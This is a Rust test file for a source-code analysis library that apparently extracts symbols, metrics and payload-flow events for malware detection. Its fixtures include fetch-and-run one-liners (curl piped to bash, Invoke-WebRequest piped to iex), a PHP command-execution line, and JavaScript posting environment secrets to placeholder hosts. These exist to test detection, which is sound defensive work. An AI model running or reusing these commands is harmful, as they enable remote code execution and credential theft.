//! End-to-end tests of source code: the AST projection, symbols, metrics,
//! literals and payload flow of each language.
//!
//! Tests that read more than one view assert the no-duplicate-work
//! guarantee (`parse_count() == 1` once those views have been read).
#![allow(
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_sign_loss,
    clippy::cast_lossless,
    clippy::float_cmp,
    reason = "fixtures build binary layouts from literals and compare exact expected values"
)]

mod common;

use std::collections::BTreeSet;

use common::{call_targets, function_names, import_names, open_named, options};
use filefacts::{FileType, FlowKind, Symbol, SymbolKind};

#[test]
fn cpan_makefile_pl_retains_perl_calls() {
    let bytes = b"use strict;\nuse warnings;\nuse ExtUtils::MakeMaker;\nWriteMakefile(NAME => 'Example');\n";
    let parsed = options()
        .path(std::path::Path::new("Example-1.0/Makefile.PL"))
        .open(bytes);
    assert_eq!(parsed.fileid().file_type(), FileType::Perl);
    assert!(
        call_targets(&parsed)
            .iter()
            .any(|name| name == "WriteMakefile")
    );
    let _ = parsed.values();
    let _ = parsed.metrics();
    let _ = parsed.flow();
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn source_ast_borrows_cached_tree_without_extraction_pass() {
    let source = b"function main() { return fetch('https://example.com'); }";
    let parsed = options()
        .path(std::path::Path::new("sample.js"))
        .open(source);

    let ast = parsed.source_ast().expect("source AST should be available");
    assert_eq!(ast.source, std::str::from_utf8(source).unwrap());
    assert_eq!(ast.tree.root_node().kind(), "program");
    assert_eq!(
        parsed.parse_count(),
        0,
        "borrowing the AST is not extraction"
    );

    assert!(call_targets(&parsed).contains(&"fetch".to_string()));
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn javascript_ast_projection_is_complete() {
    let source = br#"
        const fs = require('fs');
        chrome.cookies.getAll({ url: 'https://example.com' }, (c) => {});
        fetch('https://api.example.com/data');
        const decoded = atob("aGVsbG8=");
    "#;
    let parsed = options()
        .path(std::path::Path::new("sample.js"))
        .open(source);
    assert_eq!(parsed.fileid().file_type(), FileType::JavaScript);

    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"chrome.cookies.getAll".to_string()),
        "expected dotted target in call symbols, got {targets:?}",
    );
    assert!(
        targets.contains(&"fetch".to_string()),
        "fetch should be a call target, got {targets:?}",
    );
    assert!(
        targets.contains(&"atob".to_string()),
        "atob should be a call target, got {targets:?}",
    );

    let chrome_member = parsed
        .symbols()
        .iter_kind(SymbolKind::Member)
        .find_map(|s| match s {
            Symbol::Member { path, offset } if path == "chrome.cookies.getAll" => *offset,
            _ => None,
        });
    let expected_offset = source
        .windows(b"chrome.cookies.getAll".len())
        .position(|window| window == b"chrome.cookies.getAll")
        .expect("fixture contains chrome member") as u64;
    assert_eq!(
        chrome_member,
        Some(expected_offset),
        "member chain should carry its first source offset"
    );

    // Parse count must stay at 1 after exercising all five views.
    let _ = parsed.values();
    let _ = parsed.text();
    let _ = parsed.literals();
    let _ = parsed.metrics();
    let _ = parsed.symbols();
    let _ = parsed.fileid();
    assert_eq!(
        parsed.parse_count(),
        1,
        "all five views must share a single extraction pass"
    );
}

#[test]
fn python_ast_projection_has_imports_bindings_and_nested_literals() {
    let source = br#"import base64
import os
import subprocess as sp
from urllib import request

API_URL = "https://example.invalid/api"

def encode_value(value):
    raw = value.encode("utf-8")
    return base64.b64encode(raw).decode("ascii")

class Runner:
    def __init__(self, home):
        self.home = home

    async def fetch(self, name):
        payload = {"path": f"{self.home}/{name}.txt", "kind": "probe"}
        response = request.urlopen(API_URL, data=str(payload).encode("utf-8"))
        return response.read().decode("utf-8")

def run_command():
    env_copy = os.environ.copy()
    return sp.check_output(["/bin/echo", env_copy.get("USER", "unknown")]).decode()
"#;
    let parsed = options()
        .path(std::path::Path::new("sample.py"))
        .open(source);
    assert_eq!(parsed.fileid().file_type(), FileType::Python);

    let imports = import_names(&parsed);
    assert!(
        imports.contains(&"subprocess".to_string()),
        "aliased import keeps the bare module name, got {imports:?}"
    );
    // The alias (`sp`) is now a structured field, not concatenated into name.
    let sp_alias = parsed.symbols().iter().find_map(|s| match s {
        filefacts::Symbol::Import {
            name,
            alias: Some(a),
            ..
        } if name == "subprocess" => Some(a.clone()),
        _ => None,
    });
    assert_eq!(
        sp_alias.as_deref(),
        Some("sp"),
        "aliased import should carry the alias in the structured `alias` field"
    );
    assert!(
        imports.contains(&"request".to_string()),
        "from-import local names should be visible, got {imports:?}"
    );

    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"sp.check_output.decode".to_string()),
        "method calls on call results should keep the dotted chain, got {targets:?}",
    );

    // Module-level string binding for API_URL — verify the bind exists
    // with the right target/shape. Literal-value matching now
    // happens via the top-level `literals[]` collection correlated by
    // offset; we keep the simpler structural assertion here.
    let bind_targets: Vec<(&str, filefacts::ArgShape)> = parsed
        .symbols()
        .iter_kind(SymbolKind::Bind)
        .filter_map(|s| match s {
            Symbol::Bind { target, shape, .. } => Some((target.as_str(), *shape)),
            _ => None,
        })
        .collect();
    assert!(
        bind_targets
            .iter()
            .any(|(t, sh)| *t == "API_URL" && *sh == filefacts::ArgShape::String),
        "module string constants should be exposed as bind facts, got {bind_targets:?}",
    );

    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn shell_and_powershell_commands_populate_ast_calls() {
    let shell = br#"#!/bin/sh
curl -sL "http://example.invalid/stage.sh" | bash
-H "Header: value"
chmod +x ./stage.sh
"#;
    let parsed = options().path(std::path::Path::new("stage.sh")).open(shell);
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"curl".to_string()) && targets.contains(&"bash".to_string()),
        "shell command names should be call targets, got {targets:?}",
    );
    assert!(
        !targets.iter().any(|t| t.starts_with('-')),
        "shell option tokens should not become command targets, got {targets:?}",
    );

    let ps = br#"Invoke-WebRequest -Uri "http://example.invalid/stage.ps1" | iex
Start-Process powershell -ArgumentList "-nop", "-w hidden"
"#;
    let parsed = options().path(std::path::Path::new("stage.ps1")).open(ps);
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"Invoke-WebRequest".to_string())
            && targets.contains(&"iex".to_string())
            && targets.contains(&"Start-Process".to_string()),
        "PowerShell command names should be call targets, got {targets:?}",
    );
}

#[test]
fn typed_fact_views_are_not_mirrored_in_values() {
    let source = br"
        import fs from 'fs';
        class Runner {}
        function main() { return 'ok'; }
        fetch('https://example.com');
    ";
    let parsed = options()
        .path(std::path::Path::new("sample.js"))
        .open(source);

    assert!(
        !import_names(&parsed).is_empty(),
        "imports should populate the unified Symbols view"
    );
    assert!(
        function_names(&parsed).iter().any(|n| n == "main"),
        "function definitions should populate the unified Symbols view"
    );
    assert!(
        !parsed.literals().is_empty(),
        "literals view should be populated"
    );
    assert!(
        !parsed.symbols().is_empty(),
        "Symbols view should be populated"
    );

    let values = parsed.values();
    assert_eq!(
        values.get("source.language").and_then(|v| v.as_str()),
        Some("javascript")
    );
    for path in [
        "imports",
        "functions",
        "classes",
        "strings",
        "ast",
        "symbols",
    ] {
        assert!(
            values.get(path).is_none(),
            "{path} must live only in its typed filefacts view"
        );
    }
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn ast_metrics_mirror_ast_paths() {
    // Verify the metric-naming convention: AST-derived metrics use
    // the `ast.` prefix and mirror the view's path shape.
    let source = b"const a = [1,2,3,4,5,6,7,8,9,10,11,12]; const u = 'a'+'b'+'c'+'d';";
    let parsed = options().path(std::path::Path::new("x.js")).open(source);
    let m = parsed.metrics();
    assert!(m.get("ast.node_count").unwrap_or(0.0) > 0.0);
    assert_eq!(m.get("ast.max_array_length"), Some(12.0));
    assert_eq!(m.get("ast.max_concat_chain"), Some(4.0));
}

/// Operator density is exposed as `ast.op.<name>` metrics, keyed by canonical
/// operator name (counted inline in the single AST walk, O(1) to match, no
/// per-occurrence facts) so rules can match `type: metrics, field: 'ast.op.xor', min: N`.
#[test]
fn python_xor_operator_density_metric() {
    let source = br#"def dec(b, k):
    return bytes(c ^ k[i % len(k)] for i, c in enumerate(b))
x = a ^ b ^ c
"#;
    let parsed = options().path(std::path::Path::new("x.py")).open(source);
    let m = parsed.metrics();
    assert_eq!(m.get("ast.op.xor"), Some(3.0), "three `^` operators -> xor");
    assert_eq!(m.get("ast.op.mod"), Some(1.0), "one `%` operator -> mod");
}

/// Identity-proxy functions (`function(x){ return x }`) need a param↔return
/// backreference no regex can express; the walker checks it and exposes the
/// count as `ast.identity_function_count`.
#[test]
fn js_identity_function_density_metric() {
    let source = br#"
        function a(x) { return x; }
        function b(y) { return y; }
        const c = (z) => z;
        function d(p, q) { return p + q; }
    "#;
    let parsed = options().path(std::path::Path::new("x.js")).open(source);
    assert_eq!(
        parsed.metrics().get("ast.identity_function_count"),
        Some(3.0),
        "a, b, and the arrow are identity proxies; d is not"
    );
}

/// Comment bodies are exposed as the comment-scoped string tier so rules
/// can match keywords that appear only in comments (lowest false
/// positives — a keyword in code or a string never reaches this tier).
#[test]
fn comment_bodies_are_exposed_as_comment_facts() {
    let source = br#"// this hides a rootkit in the kernel
int legit_function(void) { return 0; }
/* multi-line
   stealth note */
"#;
    let parsed = options().path(std::path::Path::new("m.c")).open(source);
    let comments = parsed.comments();
    let joined: String = comments
        .iter()
        .map(|c| c.value.as_str())
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        joined.contains("rootkit"),
        "comment body should expose 'rootkit': {joined:?}"
    );
    assert!(
        joined.contains("stealth"),
        "multi-line comment body should expose 'stealth': {joined:?}"
    );
    // The function name is NOT a comment — must not leak into this tier.
    assert!(
        !joined.contains("legit_function"),
        "code must not appear in comment tier"
    );
    assert_eq!(parsed.parse_count(), 1);
}

/// Constructor calls (`new ProcessBuilder()`, `new java.io.File()`) resolve to
/// `Symbol::Call` targets so `kind: call` rules can match them — the type-name
/// node (Java `type_identifier`/`scoped_type_identifier`) must not drop to None.
#[test]
fn java_constructor_calls_resolve_to_call_targets() {
    let src = br#"class C { void m() { Runtime r = new ProcessBuilder("sh"); var o = new java.io.ObjectInputStream(x); } }"#;
    let parsed = options().path(std::path::Path::new("C.java")).open(src);
    let targets = call_targets(&parsed);
    assert!(
        targets.contains(&"ProcessBuilder".to_string()),
        "new ProcessBuilder() -> call target: {targets:?}"
    );
    assert!(
        targets.iter().any(|t| t.contains("ObjectInputStream")),
        "new java.io.ObjectInputStream() -> call target: {targets:?}"
    );
}

#[test]
fn csharp_qualified_constructor_resolves() {
    let src =
        br#"class C { void m() { var r = new System.Random(); var f = new BinaryFormatter(); } }"#;
    let parsed = options().path(std::path::Path::new("C.cs")).open(src);
    let targets = call_targets(&parsed);
    assert!(
        targets
            .iter()
            .any(|t| t.contains("System.Random") || t == "Random"),
        "System.Random: {targets:?}"
    );
    assert!(
        targets.iter().any(|t| t.contains("BinaryFormatter")),
        "BinaryFormatter: {targets:?}"
    );
}

#[test]
fn string_return_functions_are_counted() {
    let src = br#"
        function a() { return "alpha"; }
        function b() { return "beta"; }
        function c(x) { return x + 1; }
        const d = () => "delta";
    "#;
    let parsed = options().path(std::path::Path::new("s.js")).open(src);
    assert_eq!(
        parsed.metrics().get("ast.string_return_function_count"),
        Some(3.0),
        "a, b, and the arrow return string literals; c returns an expression"
    );
}

#[test]
fn interpolated_template_url_builders_are_not_counted() {
    // Arrow functions returning an *interpolated* template literal are URL builders /
    // computed values, not substitution-table decoder entries. They must NOT count
    // toward the obfuscation signal. Regression: a benign UniProt browser extension
    // had 14 such URL builders and tripped anti-static/obfuscation/string/reconstruct.
    let src = br#"
        const ALPHAFOLD = (id) => `https://alphafold.ebi.ac.uk/api/prediction/${id}`;
        const FEATURES = (id) => `https://www.ebi.ac.uk/proteins/api/features/${id}`;
        const UNIPROT = (id) => `https://rest.uniprot.org/uniprotkb/${id}.json`;
        function key(p) { return `${p.position}-${p.category}`; }
    "#;
    let parsed = options().path(std::path::Path::new("u.js")).open(src);
    assert_eq!(
        parsed.metrics().get("ast.string_return_function_count"),
        None,
        "interpolated template returns are computed values, not static string literals"
    );
}

#[test]
fn non_interpolated_template_returns_are_counted() {
    // A template literal with no `${...}` is effectively a static string literal.
    let src = br#"
        const a = () => `alpha`;
        const b = () => `beta`;
        function c() { return `gamma`; }
        function d() { return `delta`; }
    "#;
    let parsed = options().path(std::path::Path::new("t.js")).open(src);
    assert_eq!(
        parsed.metrics().get("ast.string_return_function_count"),
        Some(4.0),
        "static (non-interpolated) templates are string literals"
    );
}

#[test]
fn xor_mod_loop_is_detected() {
    // Python rolling-XOR decode: data[i] ^ key[i % len(key)]
    let py = br#"def dec(b,k):
    return bytes(c ^ k[i % len(k)] for i,c in enumerate(b))
"#;
    let p = options().path(std::path::Path::new("d.py")).open(py);
    assert!(
        p.metrics().get("ast.xor_mod_loop_count").unwrap_or(0.0) >= 1.0,
        "python rolling-xor: {:?}",
        p.metrics().get("ast.xor_mod_loop_count")
    );
    // Plain xor without modulo must NOT count.
    let plain = options()
        .path(std::path::Path::new("p.py"))
        .open(b"x = a ^ b\n");
    assert_eq!(plain.metrics().get("ast.xor_mod_loop_count"), None);
}

#[test]
fn php_call_string_arg_value_is_captured() {
    let src = br#"<?php $d = file_get_contents("http://evil.com/x");"#;
    let p = options().path(std::path::Path::new("f.php")).open(src);
    let arg = p
        .symbols()
        .iter_kind(SymbolKind::Call)
        .find_map(|s| match s {
            Symbol::Call {
                target: Some(t),
                args,
                ..
            } if t == "file_get_contents" => Some(args.clone()),
            _ => None,
        })
        .expect("file_get_contents call");
    assert!(
        matches!(arg.first(), Some(filefacts::Arg::String { value }) if value.contains("http://evil.com")),
        "PHP string arg value should be captured: {arg:?}"
    );
}

#[test]
fn numeric_array_max_length_metric() {
    let py = b"a = [112, 97, 121, 108, 111, 97, 100]\nb = ['x','y','z']\n";
    let p = options().path(std::path::Path::new("n.py")).open(py);
    assert_eq!(
        p.metrics().get("ast.max_numeric_array"),
        Some(7.0),
        "the 7-int array counts; the string array does not"
    );
}

#[test]
fn elixir_call_arguments_survive_unfielded_argument_lists() {
    for source in [
        "System.cmd(\"printf\", [\"hello\"])\n",
        "System.cmd \"printf\", [\"hello\"]\n",
    ] {
        let p = options()
            .path(std::path::Path::new("args.ex"))
            .open(source.as_bytes());
        let args = p
            .symbols()
            .iter_kind(SymbolKind::Call)
            .find_map(|s| match s {
                Symbol::Call {
                    target: Some(t),
                    args,
                    ..
                } if t == "System.cmd" => Some(args),
                _ => None,
            })
            .expect("System.cmd call");
        assert_eq!(args.len(), 2, "{source}: {args:?}");
        assert!(matches!(&args[0], filefacts::Arg::String { value } if value == "printf"));
        let flow = p.flow().expect("source flow");
        let call = flow
            .values
            .iter()
            .find(|v| v.target.as_deref() == Some("System.cmd"))
            .unwrap();
        assert_eq!(call.inputs.len(), 2, "symbol and flow arguments must agree");
        assert!(matches!(&flow.values[call.inputs[0]].literal,
            Some(filefacts::Arg::String { value }) if value == "printf"));
        assert_eq!(p.parse_count(), 1);
    }
}

#[test]
fn perl_static_function_nodes_retain_call_targets() {
    let source = br#"
use strict;
emit('one');
Example::emit('two');
system('printf', 'three');
my $callback = sub { return 'four' };
&$callback('five');
# counterfeit('six');
my $doc = "pretend('seven')";
"#;
    let p = options()
        .path(std::path::Path::new("calls.pl"))
        .open(source);
    assert_eq!(call_targets(&p), ["emit", "Example::emit", "system"]);
    let flow = p.flow().unwrap();
    let targets: Vec<_> = flow
        .values
        .iter()
        .filter_map(|v| v.target.as_deref())
        .collect();
    assert_eq!(targets, ["emit", "Example::emit", "system"]);
    assert_eq!(p.parse_count(), 1);
}

#[test]
fn perl_method_calls_retain_receiver_and_static_method() {
    let source = br#"
Example::Client->new('hello');
$client->emit('hello');
Example::Client->new()->emit('hello');
$client->$method('hello');
${factory()}->emit('hello');
# $client->comment_only('hello');
my $documentation = '$client->quoted_only("hello")';
"#;
    let parsed = options()
        .path(std::path::Path::new("methods.pl"))
        .open(source);
    let targets = call_targets(&parsed);
    for expected in [
        "Example::Client.new",
        "$client.emit",
        "Example::Client.new.emit",
    ] {
        assert!(
            targets.iter().any(|target| target == expected),
            "{targets:?}"
        );
    }
    assert!(!targets.iter().any(|target| target == "Example::Client"));
    assert!(!targets.iter().any(|target| target.contains("$method")));
    assert!(
        !targets
            .iter()
            .any(|target| target.contains("comment_only") || target.contains("quoted_only"))
    );
    let calls: Vec<_> = parsed.symbols().iter_kind(SymbolKind::Call).collect();
    assert_eq!(
        calls
            .iter()
            .filter(|call| matches!(call, Symbol::Call { target: None, .. }))
            .count(),
        2
    );
    let flow = parsed.flow().unwrap();
    for call in calls {
        let Symbol::Call {
            target,
            offset: Some(offset),
            ..
        } = call
        else {
            unreachable!()
        };
        assert!(flow.values.iter().any(|value| value.kind == FlowKind::Call
            && value.offset == *offset
            && value.target.as_ref() == target.as_ref()));
    }
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn perl_single_argument_is_not_mistaken_for_argument_list() {
    let source = b"emit('one'); emit(17); emit(inner('nested')); emit('a', 'b'); emit();\n";
    let p = options().path(std::path::Path::new("args.pl")).open(source);
    let calls: Vec<_> = p
        .symbols()
        .iter_kind(SymbolKind::Call)
        .filter_map(|s| match s {
            Symbol::Call {
                target: Some(t),
                args,
                ..
            } if t == "emit" => Some(args),
            _ => None,
        })
        .collect();
    assert_eq!(calls.len(), 5);
    assert!(matches!(calls[0].as_slice(), [filefacts::Arg::String { value }] if value == "one"));
    assert!(matches!(
        calls[1].as_slice(),
        [filefacts::Arg::Number { value: 17, .. }]
    ));
    assert!(matches!(calls[2].as_slice(), [filefacts::Arg::Call]));
    assert_eq!(calls[3].len(), 2);
    assert!(calls[4].is_empty());
    let flow = p.flow().unwrap();
    let inputs: Vec<_> = flow
        .values
        .iter()
        .filter(|v| v.target.as_deref() == Some("emit"))
        .map(|v| v.inputs.as_slice())
        .collect();
    assert_eq!(
        inputs.iter().map(|i| i.len()).collect::<Vec<_>>(),
        [1, 1, 1, 2, 0]
    );
    assert!(
        matches!(&flow.values[inputs[0][0]].literal, Some(filefacts::Arg::String { value }) if value == "one")
    );
    assert_eq!(flow.values[inputs[2][0]].target.as_deref(), Some("inner"));
    assert_eq!(p.parse_count(), 1);
}

#[test]
fn perl_unparenthesized_calls_retain_targets_and_arguments() {
    let source = br#"
notify('one', 'two');
notify 'one', 'two';
system('printf', '%s', 'hello');
system 'printf', '%s', 'hello';
open($input, '<', 'README');
open $input, '<', 'README';
# pretend 'comment';
my $example = "counterfeit 'quoted'";
"#;
    let parsed = options()
        .path(std::path::Path::new("list_calls.pl"))
        .open(source);
    let calls: Vec<_> = parsed.symbols().iter_kind(SymbolKind::Call).collect();
    assert_eq!(
        call_targets(&parsed),
        ["notify", "notify", "system", "system", "open", "open"]
    );
    let flow = parsed.flow().unwrap();
    for pair in calls.as_chunks::<2>().0 {
        let (
            Symbol::Call {
                args: parenthesized,
                ..
            },
            Symbol::Call {
                args: bare,
                target,
                offset: Some(offset),
            },
        ) = (pair[0], pair[1])
        else {
            unreachable!()
        };
        assert_eq!(
            serde_json::to_value(parenthesized).unwrap(),
            serde_json::to_value(bare).unwrap()
        );
        let value = flow
            .values
            .iter()
            .find(|value| value.kind == FlowKind::Call && value.offset == *offset)
            .unwrap();
        assert_eq!(value.target.as_ref(), target.as_ref());
        assert_eq!(value.inputs.len(), bare.len());
    }
    assert_eq!(parsed.parse_count(), 1);
}

#[test]
fn elixir_arguments_do_not_include_nested_calls_or_do_blocks() {
    let source =
        b"consume(produce(\"inner\"), \"outer\")\nempty()\nwrapper do\n nested(\"body\")\nend\n";
    let p = options()
        .path(std::path::Path::new("nested.ex"))
        .open(source);
    for (name, count) in [
        ("consume", 2),
        ("produce", 1),
        ("empty", 0),
        ("wrapper", 0),
        ("nested", 1),
    ] {
        let args = p
            .symbols()
            .iter_kind(SymbolKind::Call)
            .find_map(|s| match s {
                Symbol::Call {
                    target: Some(t),
                    args,
                    ..
                } if t == name => Some(args),
                _ => None,
            })
            .expect(name);
        assert_eq!(args.len(), count, "{name}: {args:?}");
    }
    assert_eq!(p.parse_count(), 1);
}

fn elixir_heredoc_cases() -> [(&'static str, &'static str); 8] {
    [
        (
            "\"\"\"\n  hello\n    world\\n\n  \"\"\"",
            "hello\n  world\n\n",
        ),
        ("'''\n  hello\\tworld\n  '''", "hello\tworld\n"),
        ("\"\"\"\n  \"\"\"", ""),
        ("\"\"\"\n  héllo\n\n    tail\n  \"\"\"", "héllo\n\n  tail\n"),
        ("\"  first\n  second\"", "  first\n  second"),
        ("\"\"\"\n  keep margin\n\"\"\"", "  keep margin\n"),
        ("\"\"\"\n\tline\\nnext\n\t\"\"\"", "line\nnext\n"),
        ("\"\"\"\n  \\\"quoted\\\"\\\\n\n  \"\"\"", "\"quoted\"\\n\n"),
    ]
}

#[test]
fn elixir_heredoc_literals_strip_delimiters_and_indentation() {
    for (literal, expected) in elixir_heredoc_cases() {
        let source = format!("consume({literal})\n");
        let p = options()
            .path(std::path::Path::new("heredoc.ex"))
            .open(source.as_bytes());
        assert!(
            p.literals().iter().any(|s| s.value == expected),
            "{literal}: {:?}",
            p.literals()
        );
        assert_eq!(p.parse_count(), 1);
    }
}

#[test]
fn elixir_heredoc_arguments_agree_with_flow_values() {
    for (literal, expected) in elixir_heredoc_cases() {
        let source = format!("consume({literal})\n");
        let p = options()
            .path(std::path::Path::new("heredoc.ex"))
            .open(source.as_bytes());
        let args = p
            .symbols()
            .iter_kind(SymbolKind::Call)
            .find_map(|s| match s {
                Symbol::Call {
                    target: Some(t),
                    args,
                    ..
                } if t == "consume" => Some(args),
                _ => None,
            })
            .expect("consume call");
        assert!(
            matches!(&args[0], filefacts::Arg::String { value } if value == expected),
            "{literal}: {args:?}"
        );
        let flow = p.flow().expect("source flow");
        let call = flow
            .values
            .iter()
            .find(|v| v.target.as_deref() == Some("consume"))
            .unwrap();
        assert!(matches!(&flow.values[call.inputs[0]].literal,
            Some(filefacts::Arg::String { value }) if value == expected));
        assert_eq!(p.parse_count(), 1);
    }
}

#[test]
fn numeric_sequence_max_length_metric() {
    // JS comma sequence of numeric literals (comma-constant obfuscation).
    let js = b"var x = (1, 2, 3, 4, 5);\n";
    let p = options().path(std::path::Path::new("s.js")).open(js);
    assert_eq!(p.metrics().get("ast.max_numeric_sequence"), Some(5.0));
}

#[test]
fn const_return_function_count_metric() {
    let js =
        b"function a(){ return 0; }\nfunction b(){ return 'x'; }\nfunction id(y){ return y; }\n";
    let p = options().path(std::path::Path::new("c.js")).open(js);
    // a() and b() are parameterless const-returns; id(y) is an identity proxy, not counted.
    assert_eq!(
        p.metrics().get("ast.const_return_function_count"),
        Some(2.0)
    );
}

#[test]
fn self_compare_count_metric() {
    // `5 - 5` (useless arithmetic) and `x === x` (opaque) count; `n !== n`
    // (the NaN idiom) does not.
    let js = b"var a = 5 - 5;\nif (x === x) {}\nif (n !== n) {}\n";
    let p = options().path(std::path::Path::new("sc.js")).open(js);
    assert_eq!(p.metrics().get("ast.self_compare_count"), Some(2.0));
}

#[test]
fn infinite_loop_count_metric() {
    let rb = b"while true\n  break\nend\n";
    let p = options().path(std::path::Path::new("l.rb")).open(rb);
    assert_eq!(p.metrics().get("ast.infinite_loop_count"), Some(1.0));
}

#[test]
fn infinite_loop_js_while_true() {
    let js = b"while (true) { f(); }\nwhile (x < 10) { g(); }\n";
    let p = options().path(std::path::Path::new("w.js")).open(js);
    // Only `while (true)` is infinite; the bounded loop is not.
    assert_eq!(p.metrics().get("ast.infinite_loop_count"), Some(1.0));
}

/// A parse cut short by the caller is not a fact about the bytes, and says so
/// for callers that cache by content; an ordinary parse does not.
#[test]
fn a_cancelled_source_parse_is_reported_incomplete() {
    use std::sync::atomic::AtomicBool;

    let source = "def f():\n    return 1\n".repeat(20_000);
    let ordinary = options()
        .path(std::path::Path::new("x.py"))
        .open(source.as_bytes());
    assert!(!ordinary.source_parse_incomplete());

    let flag = AtomicBool::new(true);
    let cancelled = options()
        .path(std::path::Path::new("x.py"))
        .cancellation(&flag)
        .open(source.as_bytes());
    assert!(cancelled.source_parse_incomplete());
}

/// One stray Latin-1 byte must not hide a script's calls.
#[test]
fn a_latin1_byte_keeps_source_calls_visible() {
    let bytes = b"<?php\n// Caf\xe9\nfunction f() { system($_GET['c']); }\n";
    let parsed = options().path(std::path::Path::new("x.php")).open(bytes);
    assert!(call_targets(&parsed).iter().any(|t| t == "system"));
    assert_eq!(parsed.metrics().get("source.invalid_utf8_bytes"), Some(1.0));
}

// ---------------------------------------------------------------------------
// JavaScript environment payload provenance
// ---------------------------------------------------------------------------

/// Kinds of the `source.payload_flow.events` reported for `source`.
fn event_kinds(source: &str) -> BTreeSet<String> {
    let parsed = open_named("index.js", source.as_bytes());
    parsed
        .values()
        .get("source.payload_flow.events")
        .and_then(|events| events.as_array())
        .expect("payload flow events")
        .iter()
        .map(|event| event["kind"].as_str().expect("event kind").to_string())
        .collect()
}

#[test]
fn javascript_process_env_alias_refines_properties_and_keeps_bulk_flow() {
    let config = "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify({model:env.SMALLCODE_MODEL,baseUrl:env.SMALLCODE_BASE_URL})});";
    let config_kinds = event_kinds(config);
    assert!(config_kinds.is_empty(), "{config_kinds:?}");

    let secret = "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify({token:env.GITHUB_TOKEN})});";
    let secret_kinds = event_kinds(secret);
    assert!(
        secret_kinds.contains("secret-http-body"),
        "{secret_kinds:?}"
    );
    assert!(
        !secret_kinds.contains("environment-http-body"),
        "{secret_kinds:?}"
    );

    for source in [
        "const env=process.env; fetch('https://example.invalid',{method:'POST',body:JSON.stringify(env)});",
        "fetch('https://example.invalid',{method:'POST',body:JSON.stringify({...process.env})});",
    ] {
        let kinds = event_kinds(source);
        assert!(
            kinds.contains("environment-http-body"),
            "{source}: {kinds:?}"
        );
        assert!(kinds.contains("secret-http-body"), "{source}: {kinds:?}");
    }
}
